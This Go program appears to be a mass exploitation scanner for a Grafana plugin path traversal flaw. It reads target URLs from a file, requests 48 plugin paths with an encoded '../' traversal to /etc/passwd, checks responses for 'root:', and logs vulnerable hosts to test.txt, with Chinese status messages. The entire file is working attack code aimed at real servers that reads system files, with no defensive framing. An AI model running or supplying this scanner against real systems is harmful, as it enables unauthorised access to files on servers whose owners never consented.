package main

import (
	"bufio"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	url2 "net/url"
	"os"
	"strings"
)

func main() {
	fileOpen, err := os.Open("url.txt")
	line := bufio.NewReader(fileOpen)
	if err != nil {
		fmt.Println(err)
	}
	test := []string{
		"/public/plugins/alertGroups/",
		"/public/plugins/alertlist/",
		"/public/plugins/alertmanager/",
		"/public/plugins/annolist/",
		"/public/plugins/barchart/",
		"/public/plugins/bargauge/",
		"/public/plugins/canvas/",
		"/public/plugins/cloudwatch/",
		"/public/plugins/dashboard/",
		"/public/plugins/dashlist/",
		"/public/plugins/debug/",
		"/public/plugins/elasticsearch/",
		"/public/plugins/gauge/",
		"/public/plugins/geomap/",
		"/public/plugins/gettingstarted/",
		"/public/plugins/grafana-azure-monitor-datasource/",
		"/public/plugins/grafana/",
		"/public/plugins/graph/",
		"/public/plugins/graphite/",
		"/public/plugins/heatmap/",
		"/public/plugins/histogram/",
		"/public/plugins/influxdb/",
		"/public/plugins/jaeger/",
		"/public/plugins/live/",
		"/public/plugins/logs/",
		"/public/plugins/loki/",
		"/public/plugins/mixed/",
		"/public/plugins/mssql/",
		"/public/plugins/mysql/",
		"/public/plugins/news/",
		"/public/plugins/nodeGraph/",
		"/public/plugins/opentsdb/",
		"/public/plugins/piechart/",
		"/public/plugins/pluginlist/",
		"/public/plugins/postgres/",
		"/public/plugins/prometheus/",
		"/public/plugins/stat/",
		"/public/plugins/state-timeline/",
		"/public/plugins/status-history/",
		"/public/plugins/table-old/",
		"/public/plugins/table/",
		"/public/plugins/tempo/",
		"/public/plugins/testdata/",
		"/public/plugins/text/",
		"/public/plugins/timeseries/",
		"/public/plugins/welcome/",
		"/public/plugins/xychart/",
		"/public/plugins/zipkin"}
	file, err := os.Create("test.txt") 
	if err != nil {
		fmt.Println(err)
	}
	for {
		content, _, err := line.ReadLine()
		if err == io.EOF {
			break
		}
		fmt.Println(string(content))
		for i := 0; i < 48; i++ {
			url := string(content) + test[i] + url2.QueryEscape("../../../../../../../../../../../../../../../../../etc/passwd")
			//fmt.Println(url)
			resp, err := http.Get(url)
			if err != nil {
				fmt.Println(err)
				continue
			}
			fmt.Println(resp, url)
			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				fmt.Println(body, err)
			}
			if find := strings.Contains(string(body), "root:"); find {
				fmt.Println("\n\u001B[1;32m[+] 存在漏洞\u001B[0m", url)
				data, err := io.WriteString(file, url+"\n")
				fmt.Println("\n\u001B[1;33m[+] 正在写入\u001B[0m")
				if err != nil {
					fmt.Println(data, err)
				}
				break
			} else {
				fmt.Println("\n\u001B[1;31m[-] 无法识别\u001B[0m", url)
			}
		}
	}
}
